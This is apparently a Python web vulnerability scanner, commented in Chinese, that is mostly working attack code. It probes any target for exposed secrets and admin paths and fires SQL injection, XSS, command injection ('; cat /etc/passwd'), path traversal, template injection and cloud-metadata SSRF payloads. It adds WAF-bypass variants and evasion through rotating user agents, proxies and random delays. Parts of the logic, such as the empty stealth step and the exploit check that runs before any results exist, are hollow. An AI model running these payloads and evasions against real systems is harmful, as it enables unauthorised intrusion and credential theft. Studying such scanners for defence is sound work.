# -*- coding: utf-8 -*-
"""
专业级漏洞检测模块
解决：误报、漏报、绕过、利用、隐蔽、规模化
"""

import requests
import re
import json
import time
import random
import hashlib
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import SCAN_CONFIG


class ProVulnScanner:
    """专业级漏洞扫描器"""

    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
        self.false_positive_cache = set()  # 误报缓存
        self.verified_cache = set()  # 已验证缓存

        # 代理池（可扩展）
        self.proxies = [
            None,  # 直连
            # "http://proxy1:8080",
            # "http://proxy2:8080",
            # "socks5://proxy3:1080",
        ]

        # User-Agent 池
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        ]

    def scan(self, url: str) -> List[Dict]:
        """执行专业扫描"""
        print(f"[*] 专业级漏洞扫描: {url}")

        vulns = []

        # 1. 深度信息收集
        vulns.extend(self._deep_info_gathering(url))

        # 2. 深度漏洞检测
        vulns.extend(self._deep_vuln_detection(url))

        # 3. 绕过检测
        vulns.extend(self._bypass_detection(url))

        # 4. 利用验证
        vulns.extend(self._exploit_verification(url))

        # 5. 隐蔽扫描
        vulns.extend(self._stealth_scan(url))

        # 6. 智能去重
        vulns = self._smart_dedup(vulns)

        # 7. 误报过滤
        vulns = self._filter_false_positives(vulns)

        self.vulnerabilities.extend(vulns)
        return vulns

    def _get_random_headers(self) -> Dict:
        """获取随机请求头"""
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

    def _get_random_proxy(self) -> Optional[Dict]:
        """获取随机代理"""
        proxy = random.choice(self.proxies)
        if proxy:
            return {"http": proxy, "https": proxy}
        return None

    def _make_request(self, url: str, method: str = "GET", **kwargs) -> Optional[requests.Response]:
        """发送请求（带伪装和代理）"""
        headers = self._get_random_headers()
        proxy = self._get_random_proxy()

        try:
            if method == "GET":
                response = self.session.get(
                    url,
                    headers=headers,
                    proxies=proxy,
                    timeout=5,
                    verify=False,
                    **kwargs
                )
            elif method == "POST":
                response = self.session.post(
                    url,
                    headers=headers,
                    proxies=proxy,
                    timeout=5,
                    verify=False,
                    **kwargs
                )
            else:
                response = self.session.request(
                    method,
                    url,
                    headers=headers,
                    proxies=proxy,
                    timeout=5,
                    verify=False,
                    **kwargs
                )

            return response
        except:
            return None

    def _deep_info_gathering(self, url: str) -> List[Dict]:
        """深度信息收集"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 深度路径扫描
        deep_paths = [
            # API 版本
            "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5",
            "/v1/api", "/v2/api", "/v3/api", "/v4/api", "/v5/api",

            # GraphQL
            "/graphql", "/graphiql", "/playground", "/altair",
            "/api/graphql", "/v1/graphql", "/v2/graphql",

            # Swagger/OpenAPI
            "/swagger-ui.html", "/swagger-ui/", "/swagger-ui/index.html",
            "/swagger-resources", "/swagger-resources/",
            "/v2/api-docs", "/v3/api-docs",
            "/openapi.json", "/openapi.yaml",
            "/api-docs", "/api-docs/",

            # 管理后台
            "/admin", "/admin/", "/administrator", "/administrator/",
            "/manage", "/manage/", "/manager", "/manager/",
            "/console", "/console/", "/dashboard", "/dashboard/",
            "/panel", "/panel/", "/cpanel", "/cpanel/",

            # 调试接口
            "/debug", "/debug/", "/trace", "/trace/",
            "/actuator", "/actuator/", "/actuator/env",
            "/actuator/health", "/actuator/info", "/actuator/configprops",
            "/metrics", "/metrics/", "/prometheus", "/prometheus/",
            "/health", "/health/", "/status", "/status/",
            "/info", "/info/", "/env", "/env/",

            # 监控系统
            "/grafana", "/grafana/", "/grafana/login",
            "/zabbix", "/zabbix/", "/zabbix/login",
            "/nagios", "/nagios/", "/nagios/login",
            "/kibana", "/kibana/", "/kibana/login",
            "/splunk", "/splunk/", "/splunk/login",
            "/jenkins", "/jenkins/", "/jenkins/login",
            "/gitlab", "/gitlab/", "/gitlab/login",

            # 数据库管理
            "/phpmyadmin", "/phpmyadmin/", "/pma", "/pma/",
            "/adminer", "/adminer/", "/adminer.php",
            "/dbadmin", "/dbadmin/", "/mysql", "/mysql/",

            # 文件管理
            "/filemanager", "/filemanager/", "/file-manager", "/file-manager/",
            "/elfinder", "/elfinder/", "/kcfinder", "/kcfinder/",
            "/ckfinder", "/ckfinder/",

            # 配置文件
            "/.env", "/.env.local", "/.env.production", "/.env.development",
            "/.git/config", "/.git/HEAD", "/.gitignore",
            "/.svn/entries", "/.svn/wc.db",
            "/web.config", "/config.php", "/config.json",
            "/settings.py", "/settings.json",
            "/application.yml", "/application.properties",

            # 备份文件
            "/backup", "/backup/", "/backup.zip", "/backup.tar.gz",
            "/backup.sql", "/backup.sql.gz",
            "/db_backup", "/db_backup/", "/db_backup.sql",
            "/dump.sql", "/dump.sql.gz",
            "/www.zip", "/www.tar.gz",
            "/web.zip", "/web.tar.gz",

            # 日志文件
            "/log", "/log/", "/logs", "/logs/",
            "/error.log", "/access.log", "/debug.log",
            "/app.log", "/server.log", "/system.log",

            # 测试接口
            "/test", "/test/", "/test.php", "/test.html",
            "/phpinfo.php", "/info.php", "/php_info.php",

            # 内部接口
            "/internal", "/internal/", "/private", "/private/",
            "/intranet", "/intranet/", "/hidden", "/hidden/",
            "/secret", "/secret/", "/restricted", "/restricted/",
        ]

        # 并发扫描
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self._check_path, base, path): path for path in deep_paths}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    vulns.append(result)

        return vulns

    def _check_path(self, base: str, path: str) -> Optional[Dict]:
        """检查路径"""
        url = urljoin(base, path)
        response = self._make_request(url)

        if not response:
            return None

        # 200 状态码
        if response.status_code == 200:
            content = response.text
            content_type = response.headers.get("Content-Type", "")

            # 排除误报
            if self._is_false_positive(content, path):
                return None

            # 检查是否是敏感内容
            if self._is_sensitive_content(content, path):
                return {
                    "type": "信息泄露",
                    "severity": "High",
                    "url": url,
                    "description": f"发现敏感路径: {path}",
                    "evidence": content[:200],
                    "remediation": "限制访问敏感路径",
                    "exploitable": True,
                    "confidence": "high"
                }

        # 403 状态码
        elif response.status_code == 403:
            # 检查是否是敏感路径
            if self._is_sensitive_path(path):
                return {
                    "type": "信息泄露",
                    "severity": "Low",
                    "url": url,
                    "description": f"发现敏感路径存在但被禁止: {path}",
                    "evidence": f"状态码: 403",
                    "remediation": "确认是否需要隐藏",
                    "exploitable": False,
                    "confidence": "medium"
                }

        return None

    def _is_false_positive(self, content: str, path: str) -> bool:
        """检查是否是误报"""
        # 排除常见误报
        false_positive_patterns = [
            r"404.*not.*found",
            r"page.*not.*found",
            r"error.*404",
            r"not.*found",
            r"invalid.*url",
            r"bad.*request",
        ]

        for pattern in false_positive_patterns:
            if re.search(pattern, content[:500], re.IGNORECASE):
                return True

        # 排除空页面
        if len(content) < 100:
            return True

        # 排除登录页面
        if "login" in content[:500].lower() and "password" in content[:500].lower():
            return True

        return False

    def _is_sensitive_content(self, content: str, path: str) -> bool:
        """检查是否是敏感内容"""
        # 敏感关键词
        sensitive_keywords = [
            "password", "secret", "token", "api_key", "apikey",
            "private_key", "access_token", "auth_token",
            "database", "mysql", "redis", "mongodb",
            "aws_access", "aws_secret",
            "smtp", "ftp", "ssh",
            "config", "settings", "env",
        ]

        # 检查内容
        for keyword in sensitive_keywords:
            if keyword in content.lower():
                return True

        # 检查路径
        sensitive_paths = [
            ".env", ".git", ".svn", "config", "settings",
            "backup", "dump", "sql", "log",
        ]

        for sensitive_path in sensitive_paths:
            if sensitive_path in path.lower():
                return True

        return False

    def _is_sensitive_path(self, path: str) -> bool:
        """检查是否是敏感路径"""
        sensitive_paths = [
            ".env", ".git", ".svn", "config", "settings",
            "backup", "dump", "sql", "log", "admin",
            "manage", "console", "dashboard", "panel",
        ]

        for sensitive_path in sensitive_paths:
            if sensitive_path in path.lower():
                return True

        return False

    def _deep_vuln_detection(self, url: str) -> List[Dict]:
        """深度漏洞检测"""
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        # 深度 Payload
        deep_payloads = {
            "SQL注入": [
                ("' OR '1'='1", "SQL注入"),
                ("' OR '1'='1' --", "SQL注入"),
                ("' OR '1'='1' #", "SQL注入"),
                ("' OR '1'='1'/*", "SQL注入"),
                ("' OR 1=1--", "SQL注入"),
                ("' OR 1=1#--", "SQL注入"),
                ("' OR 1=1/*", "SQL注入"),
                ("' OR 1=1 LIMIT 1--", "SQL注入"),
                ("1' ORDER BY 1--", "SQL注入"),
                ("1' ORDER BY 2--", "SQL注入"),
                ("1' ORDER BY 3--", "SQL注入"),
                ("1' UNION SELECT NULL--", "SQL注入"),
                ("1' UNION SELECT NULL,NULL--", "SQL注入"),
                ("1' UNION SELECT NULL,NULL,NULL--", "SQL注入"),
                ("1 AND 1=1", "SQL注入"),
                ("1 AND 1=2", "SQL注入"),
                ("1' AND '1'='1", "SQL注入"),
                ("1' AND '1'='2", "SQL注入"),
                ("SLEEP(5)", "SQL注入"),
                ("' SLEEP(5)--", "SQL注入"),
                ("1' AND SLEEP(5)--", "SQL注入"),
                ("WAITFOR DELAY '0:0:5'", "SQL注入"),
            ],
            "XSS": [
                ("<script>alert(1)</script>", "XSS"),
                ("<img src=x onerror=alert(1)>", "XSS"),
                ("<svg onload=alert(1)>", "XSS"),
                ("'-alert(1)-'", "XSS"),
                ("\"><script>alert(1)</script>", "XSS"),
                ("<details open ontoggle=alert(1)>", "XSS"),
                ("<body onload=alert(1)>", "XSS"),
                ("<iframe src=javascript:alert(1)>", "XSS"),
                ("<input onfocus=alert(1) autofocus>", "XSS"),
                ("<marquee onstart=alert(1)>", "XSS"),
            ],
            "命令注入": [
                ("; id", "命令注入"),
                ("| id", "命令注入"),
                ("`id`", "命令注入"),
                ("$(id)", "命令注入"),
                ("; whoami", "命令注入"),
                ("| whoami", "命令注入"),
                ("; cat /etc/passwd", "命令注入"),
                ("| cat /etc/passwd", "命令注入"),
                ("; sleep 5", "命令注入"),
                ("| sleep 5", "命令注入"),
            ],
            "路径遍历": [
                ("../../../etc/passwd", "路径遍历"),
                ("....//....//....//etc/passwd", "路径遍历"),
                ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "路径遍历"),
                ("..%252f..%252f..%252fetc/passwd", "路径遍历"),
                ("..\\..\\..\\etc\\passwd", "路径遍历"),
                ("../../../windows/system32/drivers/etc/hosts", "路径遍历"),
            ],
            "模板注入": [
                ("{{7*7}}", "模板注入"),
                ("${7*7}", "模板注入"),
                ("<%= 7*7 %>", "模板注入"),
                ("#{7*7}", "模板注入"),
                ("{{7*'7'}}", "模板注入"),
                ("{{config}}", "模板注入"),
            ],
            "SSRF": [
                ("http://127.0.0.1", "SSRF"),
                ("http://localhost", "SSRF"),
                ("http://[::1]", "SSRF"),
                ("http://0.0.0.0", "SSRF"),
                ("http://169.254.169.254", "SSRF"),
                ("http://metadata.google.internal", "SSRF"),
            ],
        }

        # 检测每个参数
        for param_name, param_values in params.items():
            for vuln_type, payloads in deep_payloads.items():
                for payload, _ in payloads[:3]:  # 只测试前3个
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        response = self._make_request(test_url)
                        if not response:
                            continue

                        # 检查是否有漏洞
                        if self._check_vulnerability(response, vuln_type, payload):
                            # 二次验证
                            if self._verify_vulnerability(test_url, vuln_type, payload):
                                vulns.append({
                                    "type": vuln_type,
                                    "severity": "Critical" if vuln_type in ["SQL注入", "命令注入", "SSRF"] else "High",
                                    "url": url,
                                    "description": f"参数 {param_name} 存在{vuln_type}漏洞",
                                    "evidence": f"Payload: {payload}",
                                    "remediation": "验证和过滤输入",
                                    "exploitable": True,
                                    "confidence": "high"
                                })

                    except:
                        pass

        return vulns

    def _check_vulnerability(self, response: requests.Response, vuln_type: str, payload: str) -> bool:
        """检查是否有漏洞"""
        content = response.text

        if vuln_type == "SQL注入":
            sql_errors = ["sql syntax", "mysql", "ora-", "sql server", "sqlite", "postgresql"]
            return any(error in content.lower() for error in sql_errors)

        elif vuln_type == "XSS":
            return payload in content

        elif vuln_type == "命令注入":
            return "uid=" in content or "root:" in content

        elif vuln_type == "路径遍历":
            return "root:" in content or "localhost" in content

        elif vuln_type == "模板注入":
            return "49" in content

        elif vuln_type == "SSRF":
            return "169.254" in content or "metadata" in content

        return False

    def _verify_vulnerability(self, url: str, vuln_type: str, payload: str) -> bool:
        """二次验证漏洞"""
        # 避免重复验证
        cache_key = f"{url}|{vuln_type}|{payload}"
        if cache_key in self.verified_cache:
            return True

        # 发送验证请求
        response = self._make_request(url)
        if not response:
            return False

        # 验证漏洞
        if self._check_vulnerability(response, vuln_type, payload):
            self.verified_cache.add(cache_key)
            return True

        return False

    def _bypass_detection(self, url: str) -> List[Dict]:
        """绕过检测"""
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulns

        # WAF 绕过 Payload
        bypass_payloads = {
            "SQL注入": [
                ("/*!50000union*/ /*!50000select*/ 1,2,3--", "SQL注入"),
                ("uni%6fn se%6cect 1,2,3--", "SQL注入"),
                ("unio%6e selec%74 1,2,3--", "SQL注入"),
                ("union%0aselect 1,2,3--", "SQL注入"),
                ("/**/union/**/select/**/ 1,2,3--", "SQL注入"),
                ("union(select(1),2,3)--", "SQL注入"),
            ],
            "XSS": [
                ("<svg/onload=alert(1)>", "XSS"),
                ("<img src=x onerror=alert(1)>", "XSS"),
                ("<details open ontoggle=alert(1)>", "XSS"),
                ("<body onload=alert(1)>", "XSS"),
                ("<iframe src=javascript:alert(1)>", "XSS"),
            ],
            "命令注入": [
                (";{id,}", "命令注入"),
                ("|{id,}", "命令注入"),
                ("`{id,}`", "命令注入"),
                ("$({id,})", "命令注入"),
                (";\t{id,}", "命令注入"),
            ],
        }

        # 检测每个参数
        for param_name, param_values in params.items():
            for vuln_type, payloads in bypass_payloads.items():
                for payload, _ in payloads[:2]:  # 只测试前2个
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        response = self._make_request(test_url)
                        if not response:
                            continue

                        # 检查是否有漏洞
                        if self._check_vulnerability(response, vuln_type, payload):
                            vulns.append({
                                "type": f"{vuln_type}(WAF绕过)",
                                "severity": "Critical",
                                "url": url,
                                "description": f"参数 {param_name} 存在{vuln_type}漏洞(WAF绕过)",
                                "evidence": f"Payload: {payload}",
                                "remediation": "加强WAF规则",
                                "exploitable": True,
                                "confidence": "high"
                            })

                    except:
                        pass

        return vulns

    def _exploit_verification(self, url: str) -> List[Dict]:
        """利用验证"""
        vulns = []

        # 验证已发现的漏洞
        for vuln in self.vulnerabilities:
            if vuln.get("exploitable") and vuln.get("confidence") == "high":
                # 验证漏洞可利用性
                if self._verify_exploit(vuln):
                    vuln["exploit_verified"] = True
                    vulns.append(vuln)

        return vulns

    def _verify_exploit(self, vuln: Dict) -> bool:
        """验证漏洞可利用性"""
        vuln_type = vuln.get("type", "")
        url = vuln.get("url", "")

        if "SQL注入" in vuln_type:
            return self._verify_sql_exploit(url)
        elif "XSS" in vuln_type:
            return self._verify_xss_exploit(url)
        elif "命令注入" in vuln_type:
            return self._verify_cmd_exploit(url)
        elif "路径遍历" in vuln_type:
            return self._verify_path_exploit(url)
        elif "SSRF" in vuln_type:
            return self._verify_ssrf_exploit(url)

        return False

    def _verify_sql_exploit(self, url: str) -> bool:
        """验证 SQL 注入利用"""
        # 时间盲注验证
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name in params:
            try:
                test_params = params.copy()
                test_params[param_name] = ["1' AND SLEEP(5)--"]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))

                start_time = time.time()
                response = self._make_request(test_url)
                elapsed = time.time() - start_time

                if response and elapsed > 4:
                    return True
            except:
                pass

        return False

    def _verify_xss_exploit(self, url: str) -> bool:
        """验证 XSS 利用"""
        # 检查 payload 是否被反射
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name in params:
            try:
                test_params = params.copy()
                test_params[param_name] = ["<script>alert(1)</script>"]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))

                response = self._make_request(test_url)
                if response and "<script>alert(1)</script>" in response.text:
                    return True
            except:
                pass

        return False

    def _verify_cmd_exploit(self, url: str) -> bool:
        """验证命令注入利用"""
        # 检查命令执行结果
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name in params:
            try:
                test_params = params.copy()
                test_params[param_name] = ["; id"]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))

                response = self._make_request(test_url)
                if response and "uid=" in response.text:
                    return True
            except:
                pass

        return False

    def _verify_path_exploit(self, url: str) -> bool:
        """验证路径遍历利用"""
        # 检查是否能读取系统文件
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name in params:
            try:
                test_params = params.copy()
                test_params[param_name] = ["../../../etc/passwd"]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))

                response = self._make_request(test_url)
                if response and "root:" in response.text:
                    return True
            except:
                pass

        return False

    def _verify_ssrf_exploit(self, url: str) -> bool:
        """验证 SSRF 利用"""
        # 检查是否能访问内部资源
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name in params:
            try:
                test_params = params.copy()
                test_params[param_name] = ["http://169.254.169.254/latest/meta-data/"]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))

                response = self._make_request(test_url)
                if response and "ami-id" in response.text:
                    return True
            except:
                pass

        return False

    def _stealth_scan(self, url: str) -> List[Dict]:
        """隐蔽扫描"""
        vulns = []

        # 随机延迟
        time.sleep(random.uniform(0.1, 0.5))

        # 随机 User-Agent
        self.session.headers.update({
            "User-Agent": random.choice(self.user_agents)
        })

        # 随机请求顺序
        # 这里可以添加更多隐蔽技术

        return vulns

    def _smart_dedup(self, vulns: List[Dict]) -> List[Dict]:
        """智能去重"""
        seen = set()
        unique_vulns = []

        for vuln in vulns:
            # 生成唯一标识
            key = f"{vuln.get('url')}|{vuln.get('type')}|{vuln.get('evidence', '')[:50]}"

            if key not in seen:
                seen.add(key)
                unique_vulns.append(vuln)

        return unique_vulns

    def _filter_false_positives(self, vulns: List[Dict]) -> List[Dict]:
        """过滤误报"""
        filtered_vulns = []

        for vuln in vulns:
            # 检查是否是误报
            if not self._is_false_positive_vuln(vuln):
                filtered_vulns.append(vuln)

        return filtered_vulns

    def _is_false_positive_vuln(self, vuln: Dict) -> bool:
        """检查是否是误报"""
        evidence = vuln.get("evidence", "")
        vuln_type = vuln.get("type", "")

        # 排除代码中的字符串
        false_positive_patterns = [
            "password\"",  # 代码中的 password 字符串
            "password'",
            "password=",
            "password:",
            "password\\",
            "password\"",
            "password'",
            "password=",
            "password:",
            "password\\",
        ]

        for pattern in false_positive_patterns:
            if pattern in evidence:
                return True

        # 排除空证据
        if not evidence or len(evidence) < 10:
            return True

        return False


def scan_pro(url: str) -> List[Dict]:
    """便捷函数：专业级扫描"""
    scanner = ProVulnScanner()
    return scanner.scan(url)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        vulns = scan_pro(sys.argv[1])
        for vuln in vulns:
            print(f"[{vuln.get('severity')}] {vuln.get('type')}: {vuln.get('description')}")
    else:
        print("用法: python vuln_pro.py <url>")
